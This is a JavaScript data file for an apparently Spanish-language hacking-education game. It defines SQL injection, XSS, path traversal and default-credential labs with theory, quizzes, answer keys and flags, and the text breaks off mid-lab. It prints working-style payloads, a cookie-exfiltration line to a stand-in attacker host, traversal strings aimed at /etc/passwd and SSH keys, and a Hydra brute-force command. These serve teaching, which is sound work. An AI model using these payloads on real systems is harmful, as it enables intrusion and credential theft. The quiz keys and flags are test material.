export const C = {
  bg:"#07090f", panel:"#0d1117", border:"#1e2a3a",
  cyan:"#00d4ff", green:"#00ff88", red:"#ff3b3b",
  yellow:"#ffd700", purple:"#a855f7", orange:"#ff6b35",
  muted:"#4a5568", dim:"#161b27",
};

export const LABS = [
  {
    id:"sqli", title:"SQL Injection", subtitle:"Tu Primera Inyección",
    icon:"💉", color:"#00ff88", xp:150, badge:"🗡️ SQL Slayer",
    tags:["Web","DB"], time:"~20 min",
    theory:[
      {
        t:"¿Cómo hablan las apps con las bases de datos?",
        b:`Toda app web necesita guardar y recuperar datos: usuarios, contraseñas, productos, mensajes.

Para eso usa SQL — un lenguaje que le habla a la base de datos.

Cuando haces login, la app ejecuta algo así:

SELECT * FROM users WHERE email='tu@email.com' AND password='tupass'

Si esa query devuelve un usuario → entras.
Si devuelve vacío → acceso denegado.

[!] El problema: ¿qué pasa si el atacante puede modificar esa query?`
      },
      {
        t:"¿Por qué ocurre la inyección SQL?",
        b:`El error más común en desarrollo: pegar el input del usuario DIRECTAMENTE en la query.

❌ CÓDIGO VULNERABLE:
query = "SELECT * FROM users WHERE email='" + email + "'"

Si email = "admin@banco.com" → query normal.

Pero si email = "' OR '1'='1" → la query se convierte en:

SELECT * FROM users WHERE email='' OR '1'='1'

Como '1'='1' SIEMPRE es verdadero → la condición WHERE se cumple para TODOS los registros → el atacante entra sin contraseña.

[+] CÓDIGO SEGURO:
query = "SELECT * FROM users WHERE email=?"
db.execute(query, [email])

Con Prepared Statements, el input del usuario NUNCA se ejecuta como código SQL.`
      },
      {
        t:"Anatomía de un payload SQLi",
        b:`Veamos el payload más clásico paso a paso:

' OR '1'='1

La comilla ' → cierra el string del email en la query
OR          → agrega una segunda condición
'1'='1'     → condición que SIEMPRE es verdadera

Resultado: el WHERE ya no filtra nada → devuelve TODOS los usuarios.

Variantes comunes:
' OR 1=1--
admin'--
' OR 'x'='x

El doble guión -- comenta el resto de la query, eliminando la verificación de contraseña:

SELECT * FROM users WHERE email='admin'-- ' AND password='cualquier'

Todo después de -- es ignorado por la base de datos.`
      },
      {
        t:"Tipos de SQL Injection",
        b:`>> In-band SQLi — La respuesta aparece directamente en la web:

  Error-based: Los mensajes de error revelan estructura de la DB
  UNION-based: Extrae datos de otras tablas usando UNION SELECT

  Ejemplo UNION:
  ' UNION SELECT username, password FROM users--

>> Blind SQLi — No hay respuesta visible, pero se infiere:

  Boolean-based: La app responde diferente si la condición es true/false
  Time-based: SLEEP(5) — si tarda 5 segundos, hay inyección

  Ejemplo Time-based:
  ' AND SLEEP(5)--

>> Out-of-band — Los datos se exfiltran a un servidor externo (avanzado).`
      },
      {
        t:"Impacto real y cómo defenderse",
        b:`SQLi es la vulnerabilidad más explotada en la historia de la web.

[x] Casos reales:
  Heartland Payment Systems (2008) → 130 millones de tarjetas robadas
  Sony Pictures (2011) → 77 millones de cuentas comprometidas
  Yahoo (2012) → 450,000 credenciales expuestas

¿Qué puede hacer un atacante?
[x] Extraer TODA la base de datos
[x] Saltarse la autenticación (login sin contraseña)
[x] Modificar o borrar datos
[x] En algunos casos, ejecutar comandos en el servidor

[+] DEFENSAS:
  Prepared Statements (Parametrized Queries) — la defensa #1
  ORMs como Hibernate, SQLAlchemy — abstraen SQL seguro
  Validación de input — nunca confiar en datos del usuario
  Principio de mínimo privilegio — el usuario DB no debe ser admin
  WAF (Web Application Firewall) — capa adicional de protección`
      },
    ],
    quiz:[
      {q:"¿Qué significa SQL?",opts:["Super Query Language","Structured Query Language","System Query Logic","Simple Query List"],c:1,e:"SQL = Structured Query Language. Es el lenguaje estándar para bases de datos relacionales."},
      {q:"¿Qué carácter inicia un payload SQLi básico?",opts:["#","@","'","/"],c:2,e:"La comilla simple ' cierra el string en la query y permite inyectar código SQL adicional."},
      {q:"¿Qué hace ' OR '1'='1 en una query de login?",opts:["Borra la base de datos","Hace la condición WHERE siempre verdadera","Crea un nuevo usuario admin","Cifra la contraseña"],c:1,e:"'1'='1' siempre es true, por lo que el WHERE retorna todos los registros sin filtrar."},
      {q:"¿Cuál es la defensa más efectiva contra SQLi?",opts:["Contraseñas de más de 20 caracteres","Prepared Statements (Parametrized Queries)","Cambiar el nombre de la base de datos","Usar solo HTTPS"],c:1,e:"Prepared Statements separan el código SQL de los datos del usuario — el input nunca se ejecuta como código."},
      {q:"¿Qué herramienta automatiza la detección y explotación de SQLi?",opts:["Wireshark","nmap","sqlmap","Hydra"],c:2,e:"sqlmap detecta, confirma y explota SQLi automáticamente. Es la herramienta más usada para este propósito."},
      {q:"¿Qué hace el comentario -- en un payload SQLi?",opts:["Inicia una transacción","Comenta todo el código SQL que sigue","Crea una nueva query","Eleva privilegios"],c:1,e:"-- comenta el resto de la query. Así se elimina la verificación de contraseña: WHERE email='admin'-- AND password='x'"},
      {q:"¿Qué tipo de SQLi usa la función SLEEP()?",opts:["In-band","Error-based","UNION-based","Time-based Blind"],c:3,e:"Time-based Blind SQLi usa SLEEP(5): si la respuesta tarda 5s, confirma la vulnerabilidad sin ver datos directamente."},
      {q:"¿Cuántas tarjetas robó el SQLi a Heartland Payment Systems?",opts:["13 millones","50 millones","130 millones","500 millones"],c:2,e:"El ataque a Heartland en 2008 es uno de los mayores robos de datos de la historia: 130 millones de tarjetas."},
      {q:"¿Qué hace UNION SELECT en un ataque SQLi?",opts:["Borra tablas","Combina resultados de múltiples queries para extraer datos","Crea usuarios admin","Cifra los datos"],c:1,e:"UNION SELECT permite anexar una segunda query y extraer datos de otras tablas, como credenciales o emails."},
      {q:"¿Qué hace el flag --dbs en sqlmap?",opts:["Borra todas las bases de datos","Lista todas las bases de datos disponibles","Hace backup","Cifra la DB"],c:1,e:"sqlmap --dbs enumera todas las bases de datos del servidor, primer paso para mapear el objetivo."},
      {q:"¿Qué es el Blind SQLi?",opts:["Un SQLi que no deja logs","Un SQLi donde la respuesta no es visible — se infiere por comportamiento","Un SQLi en bases NoSQL","Un SQLi cifrado"],c:1,e:"En Blind SQLi no ves datos directamente. Deduces la info según cómo responde la app (true/false o delays)."},
      {q:"¿Bajo qué categoría aparece SQLi en OWASP Top 10?",opts:["A01 Broken Access Control","A02 Cryptographic Failures","A03 Injection","A07 Identification Failures"],c:2,e:"SQLi es parte de A03:Injection en OWASP Top 10 — históricamente la vulnerabilidad más crítica en aplicaciones web."},
    ],
    lab:{
      scene:"BancoSeguro construye su query de login concatenando strings directamente con el input del usuario. El campo email no tiene ninguna sanitización ni validación.",
      target:"Panel Login — BancoSeguro Admin",
      obj:"Accede al panel de administración sin conocer las credenciales usando SQL Injection",
      steps:[
        "Abre la simulación interactiva en la lección 5/5 de la teoría",
        "Observa cómo la query se construye en tiempo real mientras escribes",
        "Escribe una comilla simple ' en el campo email y observa qué pasa",
        "Aplica el payload completo: ' OR '1'='1 para bypassear la autenticación",
        "Captura la flag — en el campo de abajo ingresa tu payload"
      ],
      hint:"Empieza con una comilla simple. Necesitas que la condición WHERE sea siempre verdadera.",
      ph:"Ingresa tu payload SQLi en el campo email...",
      flag:"HACKFORGE{sql_1nj3ct10n_byp4ss}",
      ok:(v)=>{ const n=v.toLowerCase(); return n.includes("'")&&(n.includes("or")||n.includes("--")); },
      msg:"✅ Query manipulada exitosamente. La condición WHERE fue bypasseada — acceso concedido como administrador sin contraseña.",
    }
  },

  {
    id:"xss", title:"XSS Básico", subtitle:"El Mensaje Invisible",
    icon:"👾", color:"#ff6b35", xp:150, badge:"🕷️ Script Injector",
    tags:["Web","JS"], time:"~20 min",
    theory:[
      {
        t:"¿Cómo funciona el navegador con HTML?",
        b:`Para entender XSS necesitas entender algo clave sobre los navegadores:

Cuando el navegador recibe HTML, lo ejecuta. Sin preguntar.

Si el servidor responde con:
<p>Hola mundo</p>

→ El navegador muestra "Hola mundo".

Pero si el servidor responde con:
<script>alert('XSS')</script>

→ El navegador EJECUTA el JavaScript. No lo muestra como texto.

[!] El problema: ¿qué pasa si el atacante logra que el servidor incluya su JavaScript en una página?

Eso es exactamente XSS (Cross-Site Scripting).`
      },
      {
        t:"¿Por qué ocurre XSS?",
        b:`XSS ocurre cuando una app web incluye input del usuario en HTML SIN sanitizarlo.

❌ CÓDIGO VULNERABLE (PHP):
echo "<p>Bienvenido, " . $_GET['nombre'] . "</p>";

Si nombre = "Juan" → muestra "Bienvenido, Juan". Normal.

Pero si nombre = "<script>alert(document.cookie)</script>":

→ La página HTML queda así:
<p>Bienvenido, <script>alert(document.cookie)</script></p>

→ El navegador ejecuta el script y expone las cookies.

[+] CÓDIGO SEGURO:
echo "<p>Bienvenido, " . htmlspecialchars($_GET['nombre']) . "</p>";

htmlspecialchars convierte < en &lt; — el navegador lo muestra como texto, nunca lo ejecuta.`
      },
      {
        t:"Tipos de XSS y su peligro",
        b:`>> XSS Reflejado — El payload viaja en la URL:
  https://victima.com/buscar?q=<script>alert(1)</script>
  Solo afecta a quien hace click en el enlace malicioso.
  Se usa en ataques de phishing.

>> XSS Almacenado (Persistente) — El payload se guarda en la DB:
  El atacante publica un comentario con código malicioso.
  TODOS los visitantes que lean ese comentario son atacados.
  Es el más peligroso — afecta a miles de usuarios sin que hagan nada.

>> XSS basado en DOM — Manipula el DOM sin pasar por el servidor:
  El JavaScript de la página toma datos de la URL y los inyecta en el DOM.
  No queda rastro en los logs del servidor.

📊 El gusano Samy (2005): XSS almacenado en MySpace
→ Infectó 1,000,000 de perfiles en menos de 24 horas.`
      },
      {
        t:"¿Qué puede hacer un atacante con XSS?",
        b:`Con JavaScript ejecutándose en el navegador de la víctima, el atacante puede:

[cookie] Robar cookies de sesión:
document.location='https://atacante.com?c='+document.cookie

→ Con esa cookie, el atacante accede a la cuenta SIN saber la contraseña.

[cam] Keylogging — capturar todo lo que escribe la víctima.

[mask] Defacement — modificar el contenido visual de la página.

[pc] BeEF Framework — tomar control total del navegador:
  Ejecutar comandos remotos
  Tomar screenshots
  Redirigir a páginas falsas
  Acceder a la cámara (si el usuario da permiso)

Payloads básicos:
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(document.cookie)>`
      },
      {
        t:"Defensa contra XSS",
        b:`[+] Output Encoding — Convierte caracteres especiales antes de mostrarlos:
  < se convierte en &lt;
  > se convierte en &gt;
  " se convierte en &quot;
  El navegador muestra el texto pero NUNCA lo ejecuta.

[+] Content Security Policy (CSP) — Header HTTP que controla qué scripts puede ejecutar el navegador:
  Content-Security-Policy: script-src 'self'
  Solo scripts del propio dominio pueden ejecutarse.

[+] HTTPOnly Cookies — Las cookies con este flag NO son accesibles desde JavaScript:
  Set-Cookie: session=abc123; HttpOnly; Secure
  Aunque haya XSS, el atacante no puede robar esta cookie.

[+] DOMPurify — Librería JavaScript para sanitizar HTML dinámico:
  const clean = DOMPurify.sanitize(userInput);
  Elimina todo JavaScript del HTML antes de insertarlo al DOM.`
      },
    ],
    quiz:[
      {q:"¿Qué significa XSS?",opts:["Cross-Site Scripting","Cross-System Security","Cross-Server Storage","Cross-Source Syntax"],c:0,e:"XSS = Cross-Site Scripting. Permite inyectar JavaScript malicioso en páginas web."},
      {q:"¿Cuándo ocurre XSS?",opts:["Cuando la DB está sin cifrar","Cuando la app incluye input del usuario en HTML sin sanitizar","Cuando el SSL está caducado","Cuando el servidor está desactualizado"],c:1,e:"XSS ocurre cuando el input del usuario se refleja en HTML sin escapar los caracteres especiales como < y >."},
      {q:"¿Qué tipo de XSS afecta a TODOS los visitantes del sitio?",opts:["Reflejado","DOM-based","Almacenado (Persistente)","URL-based"],c:2,e:"XSS Almacenado persiste en la base de datos. Cada visitante que carga la página infectada ejecuta el script."},
      {q:"¿Qué propiedad de cookie impide su robo por JavaScript?",opts:["Secure","SameSite","Path","HttpOnly"],c:3,e:"HttpOnly hace que la cookie sea inaccesible desde JavaScript. Aunque haya XSS, document.cookie no la mostrará."},
      {q:"¿Qué hace document.cookie en un payload XSS?",opts:["Borra las cookies del usuario","Accede a las cookies del dominio actual","Crea una nueva sesión","Cifra los datos de sesión"],c:1,e:"document.cookie devuelve todas las cookies del dominio. Con XSS, el atacante puede enviarlas a su servidor."},
      {q:"¿Cuántos perfiles infectó el gusano Samy en MySpace?",opts:["10,000","100,000","500,000","1,000,000"],c:3,e:"El gusano Samy infectó 1 millón de perfiles en menos de 24 horas en 2005 — el XSS almacenado más famoso."},
      {q:"¿Qué hace htmlspecialchars() en PHP?",opts:["Cifra el HTML","Convierte < en &lt; para que no se ejecute como código","Elimina el HTML completamente","Valida el formato del input"],c:1,e:"htmlspecialchars convierte caracteres especiales en entidades HTML. El navegador los muestra como texto, no los ejecuta."},
      {q:"¿Qué payload XSS funciona cuando el tag script está bloqueado?",opts:["' OR 1=1--","<img src=x onerror=alert(1)>","../../../etc/passwd","admin:admin"],c:1,e:"<img src=x onerror=alert(1)> ejecuta JS cuando la imagen falla al cargar. Útil cuando script está bloqueado por WAF."},
      {q:"¿Qué hace un Content Security Policy (CSP)?",opts:["Cifra las cookies","Controla qué scripts puede ejecutar el navegador","Filtra el tráfico de red","Valida certificados SSL"],c:1,e:"CSP es un header HTTP que le dice al navegador qué scripts son legítimos. Bloquea XSS aunque el payload sea inyectado."},
      {q:"¿Qué framework convierte XSS en control total del navegador?",opts:["Metasploit","BeEF (Browser Exploitation Framework)","Burp Suite","Wireshark"],c:1,e:"BeEF permite comandar navegadores comprometidos vía XSS: ejecutar comandos, capturar pantalla, redirigir usuarios."},
      {q:"¿En qué tipo de XSS el payload está en la URL?",opts:["Almacenado","DOM-based","Reflejado","Persistente"],c:2,e:"XSS Reflejado viaja en la URL. El atacante engaña a la víctima para que haga click en un enlace malicioso."},
      {q:"¿Qué librería JavaScript sanitiza HTML dinámico?",opts:["jQuery","Lodash","DOMPurify","Axios"],c:2,e:"DOMPurify es el estándar para sanitizar HTML en el cliente. Elimina todo JavaScript del HTML antes de insertarlo al DOM."},
    ],
    lab:{
      scene:"ForoHack renderiza los comentarios de usuarios usando innerHTML directamente — sin sanitizar ni escapar el contenido. Cualquier HTML que publiques se ejecuta en el navegador de todos los visitantes.",
      target:"Muro de Comentarios — ForoHack",
      obj:"Inyecta JavaScript malicioso que robe las cookies de sesión de todos los visitantes",
      steps:[
        "Ve a la lección 5/5 en Teoría y abre la simulación del muro de comentarios",
        "Primero escribe un comentario normal para entender cómo funciona el sistema",
        "Ahora intenta inyectar el payload básico: <script>alert(1)</script>",
        "Observa cómo el script se ejecuta en el navegador de cada visitante",
        "Para el lab, usa el payload con document.cookie para demostrar el robo de sesión"
      ],
      hint:"Usa el tag <script> con alert(document.cookie) — o el payload con onerror si script está bloqueado.",
      ph:"<script>alert(document.cookie)</script>",
      flag:"HACKFORGE{xss_st0r3d_3x3cut3d}",
      ok:(v)=>{ const n=v.toLowerCase(); return (n.includes("<script>")||n.includes("onerror")||n.includes("onload"))&&(n.includes("alert")||n.includes("cookie")); },
      msg:"✅ Script inyectado y almacenado. Cada visitante que cargue el foro ejecutará tu JavaScript — las cookies de sesión están comprometidas.",
    }
  },

  {
    id:"traversal", title:"Path Traversal", subtitle:"Puertas Abiertas",
    icon:"📂", color:"#a855f7", xp:150, badge:"🗂️ Path Walker",
    tags:["Web","Archivos"], time:"~20 min",
    theory:[
      {
        t:"¿Cómo sirve archivos un servidor web?",
        b:`Muchas apps web permiten descargar o visualizar archivos dinámicamente.

El servidor tiene un directorio raíz llamado web root:
/var/www/html/

Cuando pides un archivo:
https://victima.com/descargar?file=manual.pdf

El servidor busca:
/var/www/html/manual.pdf

Y te lo sirve. Correcto hasta aquí.

[!] El problema: ¿qué pasa si el servidor NO verifica que la ruta solicitada esté dentro del web root?

El atacante puede navegar FUERA del web root y acceder a cualquier archivo del sistema.`
      },
      {
        t:"La secuencia ../ — sube un directorio",
        b:`En cualquier sistema de archivos, ../ significa "sube un nivel":

Estás en:  /var/www/html/
../        →  /var/www/
../../     →  /var/
../../../  →  /    (raíz del sistema)

Entonces si el servidor no valida la ruta:
https://victima.com/descargar?file=../../../etc/passwd

El servidor busca:
/var/www/html/../../../etc/passwd
→ que se resuelve como:
/etc/passwd

¡El servidor sirve el archivo de usuarios del sistema!

URL Encoding para evadir filtros:
../ → %2e%2e%2f
Doble encoding: %252e%252e%252f`
      },
      {
        t:"El archivo /etc/passwd — el objetivo clásico",
        b:`/etc/passwd es el primer objetivo de Path Traversal en Linux.

Contiene información de TODOS los usuarios del sistema:

root:x:0:0:root:/root:/bin/bash
www-data:x:33:33::/var/www:/bin/sh
waldo:x:1000:1000::/home/waldo:/bin/bash

Cada campo separado por : significa:
username : password(x=hash en shadow) : UID : GID : info : home : shell

Con esta info el atacante sabe:
→ Qué usuarios existen en el sistema
→ Sus directorios home (donde pueden haber claves SSH)
→ Qué shell usan (indicio de si es interactivo)

Las contraseñas hasheadas están en /etc/shadow (requiere root).`
      },
      {
        t:"Archivos valiosos y técnicas de evasión",
        b:`Archivos de alto valor en Linux:
/etc/passwd          → lista de usuarios
/etc/shadow          → contraseñas hasheadas (requiere root)
/proc/self/environ   → variables de entorno (API keys, DB passwords)
~/.ssh/id_rsa        → clave privada SSH del usuario
.env                 → credenciales de la app
/var/log/apache2/access.log → logs del servidor

Técnicas de evasión cuando hay filtros:
../     bloqueado → probar %2e%2e%2f (URL encoding)
../     bloqueado → probar ....// (doble barra)
../     bloqueado → probar ..%2f (encoding parcial)
Null byte: ../../../etc/passwd%00.jpg (PHP antiguo)

En Windows los archivos objetivo son:
..\..\..\..\windows\win.ini
..\..\..\..\boot.ini`
      },
      {
        t:"Impacto real y cómo defenderse",
        b:`[x] Casos reales:
  Juniper Networks (2018) → Path Traversal en panel de gestión
  Citrix (CVE-2019-19781) → millones de dispositivos vulnerables
  VMware vCenter (2021) → acceso sin autenticación a archivos del sistema

¿Qué puede hacer el atacante?
[x] Leer archivos de configuración con credenciales
[x] Obtener claves SSH y acceder directamente al servidor
[x] Leer variables de entorno con API keys y tokens
[x] Escalar el ataque a Remote Code Execution

[+] DEFENSAS:
  Nunca usar input del usuario directamente en rutas de archivo
  Resolver la ruta real con realpath() y verificar que esté dentro del web root
  Lista blanca de archivos permitidos (allowlist)
  Chroot — confinar el proceso a un directorio específico
  Correr el servidor web con usuario de mínimos privilegios`
      },
    ],
    quiz:[
      {q:"¿Qué significa la secuencia ../ en una ruta de archivo?",opts:["Entra a una subcarpeta","Sube un nivel al directorio padre","Crea un nuevo directorio","Elimina el archivo actual"],c:1,e:"../ navega hacia el directorio padre. Con suficientes ../ se puede llegar a la raíz del sistema."},
      {q:"¿Qué archivo de Linux lista todos los usuarios del sistema?",opts:["/etc/hosts","/etc/shadow","/etc/passwd","/proc/version"],c:2,e:"/etc/passwd contiene todos los usuarios: nombre, UID, GID, directorio home y shell. Es legible por cualquier usuario."},
      {q:"¿Cuántos ../ necesitas desde /var/www/html/ para llegar a /?",opts:["1","2","3","4"],c:2,e:"Desde /var/www/html/: ../ → /var/www/, ../../ → /var/, ../../../ → /. Son 3 niveles."},
      {q:"¿Cómo se codifica ../ en URL encoding?",opts:["%2e%2e%2f","%61%62%63","%2f%2e%2e","%2e%2f%2e"],c:0,e:". = %2e, / = %2f. Por lo tanto ../ = %2e%2e%2f. Se usa para evadir filtros que bloquean ../ en texto plano."},
      {q:"¿Qué archivo puede exponer API keys y contraseñas de bases de datos?",opts:["/etc/passwd","/var/log/syslog","/proc/self/environ","/etc/hosts"],c:2,e:"/proc/self/environ contiene las variables de entorno del proceso actual, donde suelen estar DB_PASS, API_KEY, SECRET_KEY."},
      {q:"¿Cuál es la defensa más efectiva contra Path Traversal?",opts:["Usar HTTPS en el servidor","Resolver la ruta con realpath() y verificar que esté dentro del web root","Cambiar los nombres de archivos sensibles","Aumentar la complejidad de las contraseñas"],c:1,e:"realpath() resuelve ../ y symlinks. Si la ruta resuelta no empieza con el web root permitido, se rechaza la petición."},
      {q:"¿Para qué sirve el Null Byte (%00) en Path Traversal?",opts:["Para cifrar la ruta","Para terminar el string y evadir filtros de extensión","Para subir un directorio extra","Para codificar el slash"],c:1,e:"En PHP antiguo, %00 termina el string. ../../../etc/passwd%00.jpg pasa el filtro .jpg pero accede a /etc/passwd."},
      {q:"¿Qué técnica de aislamiento confina el proceso al web root?",opts:["HTTPS","Chroot/Jail","Firewall de aplicación","VPN"],c:1,e:"Chroot cambia el directorio raíz aparente del proceso. El servidor web cree que / es /var/www/html/, limitando el daño."},
      {q:"¿Qué archivo de configuración en IIS puede contener credenciales?",opts:["win.ini",".htaccess","web.config","config.sys"],c:2,e:"web.config en IIS puede contener connection strings con credenciales de base de datos en texto plano."},
      {q:"¿Cuál de estos es un payload de Path Traversal?",opts:["admin:admin","' OR 1=1--","../../../etc/passwd","<script>alert(1)</script>"],c:2,e:"../../../etc/passwd usa ../ repetidamente para salir del web root y acceder al archivo de usuarios del sistema."},
      {q:"¿Qué archivo de Linux contiene las contraseñas hasheadas?",opts:["/etc/passwd","/etc/shadow","/etc/users","/proc/passwords"],c:1,e:"/etc/shadow contiene los hashes de contraseñas. Solo root puede leerlo — si hay Path Traversal con ese privilegio, es crítico."},
      {q:"¿Qué es el 'web root' de un servidor?",opts:["La IP pública del servidor","El directorio base desde donde el servidor sirve archivos públicamente","El certificado SSL del dominio","La cuenta de administrador del sistema"],c:1,e:"El web root (ej: /var/www/html/) es el único directorio que debería ser accesible públicamente. Path Traversal lo escapa."},
    ],
    lab:{
      scene:"FileServer Pro permite descargar archivos usando el parámetro ?file= en la URL. El código del servidor no valida que la ruta solicitada esté dentro del directorio permitido.",
      target:"Servidor de Archivos — FileServer Pro",
      obj:"Usa Path Traversal para leer /etc/passwd y descubrir los usuarios del sistema",
      steps:[
        "Ve a la lección 5/5 en Teoría y abre el navegador de archivos interactivo",
        "Primero prueba descargando un archivo legítimo: images/logo.png",
        "Ahora empieza a agregar ../ para subir directorios desde el web root",
        "Necesitas subir 3 niveles para llegar a la raíz del sistema",
        "Apunta a /etc/passwd: usa ../../../etc/passwd como parámetro"
      ],
      hint:"Desde el web root /var/www/html/, necesitas exactamente 3 niveles de ../ para llegar a /etc/",
      ph:"Ej: ../../../etc/passwd",
      flag:"HACKFORGE{p4th_tr4v3rs4l_r00t}",
      ok:(v)=>{ const n=v.toLowerCase(); return n.includes("../")&&(n.includes("passwd")||n.includes("shadow")||n.includes("environ")); },
      msg:"✅ Archivo leído fuera del web root. El servidor sirvió /etc/passwd sin autenticación — usuarios del sistema expuestos.",
    }
  },

  {
    id:"defaultcreds", title:"Credenciales Default", subtitle:"admin:admin",
    icon:"🔑", color:"#ffd700", xp:150, badge:"🗝️ Default Hunter",
    tags:["Auth","IoT"], time:"~15 min",
    theory:[
      {
        t:"¿Qué son las credenciales por defecto?",
        b:`Cada router, cámara IP, switch, NAS, impresora o sistema de gestión viene de fábrica con credenciales preconfiguradas.

El fabricante necesita que el técnico pueda acceder al dispositivo recién comprado.

Credenciales típicas:
admin / admin
admin / 1234
admin / 12345
admin / password
root / root
root / (vacío)

El problema es que están documentadas PÚBLICAMENTE:
→ En el manual del fabricante
→ En routerpasswords.com
→ En defaultpassword.com
→ En CVE databases

[!] El usuario DEBE cambiarlas. La mayoría no lo hace nunca.`
      },
      {
        t:"¿Por qué nadie cambia las credenciales?",
        b:`Este es un problema humano más que técnico:

- Pereza — "Lo cambio después" (el después nunca llega)
- Urgencia — El técnico instala rápido y se va sin configurar seguridad
- Ignorancia — El usuario no sabe que existen credenciales por defecto
- Escala — En IoT industrial se despliegan miles de dispositivos iguales
🏢 Responsabilidad difusa — "Eso lo configura el de sistemas"

El resultado en números:
→ ~40% de routers domésticos nunca han cambiado sus credenciales
→ ~60% de cámaras IP industriales usan credenciales de fábrica
→ Miles de dispositivos son accesibles directamente desde internet

Herramienta Shodan — el "Google de los dispositivos conectados":
→ Busca: "default password" → miles de resultados
→ Busca: "admin:admin" → dispositivos sin cambiar`
      },
      {
        t:"El ataque de Mirai Botnet — 2016",
        b:`El ataque de credenciales por defecto más devastador de la historia.

[bot] Mirai fue un malware que escaneaba internet buscando dispositivos IoT.

Su método era brutalmente simple:
1. Escanear internet completo buscando dispositivos en puertos 23 (Telnet) y 22 (SSH)
2. Intentar las 62 combinaciones de credenciales por defecto más comunes
3. Si entraba → infectar el dispositivo → hacerlo parte de la botnet

Resultado:
→ 600,000 dispositivos infectados (cámaras, routers, DVRs)
→ Todos usaban credenciales que NUNCA fueron cambiadas

[x] El ataque:
Mirai usó esos 600K dispositivos para lanzar un DDoS de 1.2 Tbps contra Dyn DNS.
Dyn DNS cayó → dejó sin acceso a:
→ Netflix, Twitter, Reddit, GitHub, Spotify, Amazon, PayTal

Media costa este de EE.UU. sin internet por horas.
Todo por admin:admin.`
      },
      {
        t:"Herramientas para encontrar credenciales por defecto",
        b:`[buscar] Reconocimiento pasivo (sin atacar):
  Shodan.io — indexa dispositivos expuestos en internet
  Censys.io — similar a Shodan, con más datos de certificados
  routerpasswords.com — base de datos de credenciales por marca/modelo

[notas] Wordlists para ataques de credenciales:
  SecLists/Passwords/Default-Credentials/ — listas específicas por vendor
  rockyou.txt — 14.3 millones de contraseñas reales filtradas

[tool] Herramientas de fuerza bruta:
  Hydra — soporta SSH, FTP, HTTP, RDP, Telnet, SMB
  Medusa — similar a Hydra, paralelo
  Burp Intruder — para aplicaciones web

Ejemplo Hydra:
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form`
      },
      {
        t:"Defensa — Cómo protegerse",
        b:`La defensa contra credenciales por defecto es simple pero requiere disciplina:

[+] Cambiar credenciales ANTES de conectar el dispositivo a la red
  No "después de configurar todo lo demás"
  No "cuando tenga tiempo"
  ANTES. Siempre.

[+] Contraseñas fuertes y únicas:
  Mínimo 12 caracteres
  Mezcla de mayúsculas, minúsculas, números y símbolos
  Una contraseña diferente por dispositivo/servicio

[+] Gestores de contraseñas:
  Bitwarden — open source, gratuito
  1Password — premium, excelente UX
  KeePassXC — offline, sin nube

[+] MFA/2FA siempre que sea posible:
  TOTP (Google Authenticator, Authy)
  Llaves de seguridad físicas (YubiKey)

[+] Auditorías periódicas:
  nmap para descubrir dispositivos en la red
  Shodan para verificar qué de tu infraestructura está expuesto a internet`
      },
    ],
    quiz:[
      {q:"¿Cuál es la combinación de credenciales por defecto más documentada?",opts:["root/toor","admin/admin","user/1234","guest/guest"],c:1,e:"admin/admin es la más común y la primera que cualquier atacante prueba. Presente en miles de dispositivos."},
      {q:"¿Qué es Shodan?",opts:["Un antivirus para IoT","Un sistema operativo para hackers","Un motor de búsqueda de dispositivos conectados a internet","Una lista de contraseñas por defecto"],c:2,e:"Shodan indexa dispositivos expuestos: routers, cámaras, servidores, PLCs industriales. Busca 'default password' y verás miles de resultados."},
      {q:"¿Qué malware de 2016 comprometió 600,000 dispositivos IoT con credenciales por defecto?",opts:["WannaCry","Mirai","Stuxnet","Zeus"],c:1,e:"Mirai infectó 600K dispositivos usando las 62 credenciales por defecto más comunes. Causó el mayor DDoS de la historia hasta ese momento."},
      {q:"¿Cuántas contraseñas contiene el diccionario rockyou.txt?",opts:["1 millón","5 millones","14.3 millones","100 millones"],c:2,e:"rockyou.txt tiene 14.3 millones de contraseñas reales filtradas de RockYou en 2009. Es el wordlist más usado en pentesting."},
      {q:"¿Qué herramienta de pentesting hace fuerza bruta en SSH, FTP, HTTP y RDP?",opts:["Wireshark","nmap","Hydra","Metasploit"],c:2,e:"Hydra es la herramienta más popular para fuerza bruta de credenciales en red. Soporta más de 50 protocolos."},
      {q:"¿Qué porcentaje aproximado de cámaras IP industriales usa credenciales por defecto?",opts:["5%","15%","60%","95%"],c:2,e:"Estudios muestran que ~60% de cámaras IP en entornos industriales nunca tuvieron sus credenciales cambiadas."},
      {q:"¿Qué servicio de DNS atacó Mirai Botnet en 2016?",opts:["Google DNS (8.8.8.8)","Cloudflare DNS","Dyn DNS","AWS Route53"],c:2,e:"Mirai atacó Dyn DNS con 1.2 Tbps de tráfico. Dyn gestionaba DNS de Netflix, Twitter, Reddit y GitHub — todos cayeron."},
      {q:"¿Qué es SecLists en el contexto de seguridad?",opts:["Una empresa de ciberseguridad","Un repositorio con listas de contraseñas, usuarios y payloads para pentesting","Un escáner de vulnerabilidades","Un framework de explotación"],c:1,e:"SecLists es el repositorio más completo de wordlists para pentesting: contraseñas, usernames, payloads, fuzzing lists."},
      {q:"¿Cuándo se deben cambiar las credenciales por defecto de un dispositivo?",opts:["Después de conectarlo a internet","Cuando algo falla","Antes de conectarlo a cualquier red","Solo si el manual lo indica"],c:2,e:"ANTES de conectar. Una vez en red, un dispositivo con credenciales por defecto puede ser comprometido en minutos por bots automatizados."},
      {q:"¿Qué hace Burp Suite Intruder en un ataque de credenciales?",opts:["Escanea puertos","Automatiza peticiones HTTP probando listas de credenciales","Descifra hashes","Analiza tráfico de red"],c:1,e:"Burp Intruder automatiza peticiones HTTP iterando sobre listas. Ideal para ataques de fuerza bruta en formularios de login web."},
      {q:"¿Qué significa IoT?",opts:["Internet of Technology","Internet of Things","Interface of Tools","Interconnected Object Tech"],c:1,e:"IoT = Internet of Things. Dispositivos físicos conectados a internet: cámaras, routers, sensores, electrodomésticos, PLCs industriales."},
      {q:"¿Qué gestor de contraseñas open source y gratuito se recomienda?",opts:["LastPass","1Password","Bitwarden","Dashlane"],c:2,e:"Bitwarden es open source, gratuito en su versión básica, auditable y con apps para todas las plataformas. El estándar en la comunidad de seguridad."},
    ],
    lab:{
      scene:"CámarasCity instaló 50 cámaras Hikvision DVR para vigilancia del municipio. El técnico no cambió las credenciales de fábrica y el panel de administración está accesible desde internet.",
      target:"Panel Admin — CámarasCity (Hikvision DVR)",
      obj:"Encuentra las credenciales por defecto de Hikvision e ingresa al panel de administración",
      steps:[
